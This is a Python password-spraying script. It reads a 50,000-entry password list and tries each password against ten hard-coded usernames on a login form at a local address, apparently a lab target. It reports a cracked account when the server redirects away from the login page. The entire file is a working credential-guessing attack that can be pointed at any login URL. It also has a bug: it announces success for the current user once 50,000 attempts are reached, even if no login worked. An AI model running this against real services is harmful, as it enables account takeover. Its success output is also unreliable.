import requests
import json
import os
import random

LOGIN_URL = "http://127.0.0.1:8000/login"

usernames = [
    "user1",
    "user2",
    "john",
    "charlie",
    "oliver",
    "nina",
    "bruce",
    "derek",
    "elena", 
    "linda"

]

PASSWORDS_FILE = "passwords_50k.json"

def load_passwords():
   
    if not os.path.exists(PASSWORDS_FILE):
        print(f"[ERROR]  {PASSWORDS_FILE} ")
        return []
    
    with open(PASSWORDS_FILE, "r", encoding="utf-8") as f:
        passwords = json.load(f)
    random.shuffle(passwords)
    return passwords

def password_spraying():
    session = requests.Session()
    passwords = load_passwords()
    count_try =0
    for password in passwords:
        for username in usernames:
            
            r = session.post(
                LOGIN_URL,
                data={
                    "username": username,
                    "password": password
                },
                allow_redirects=False
            )
            count_try +=1

            if (r.status_code == 302 and "/login" not in r.headers.get("Location", "")) or count_try == 50000:
                print(f"[SUCCESS] cracked user: {username}")
                return


    print("[DONE] No valid credentials found")

if __name__ == "__main__":
    password_spraying()
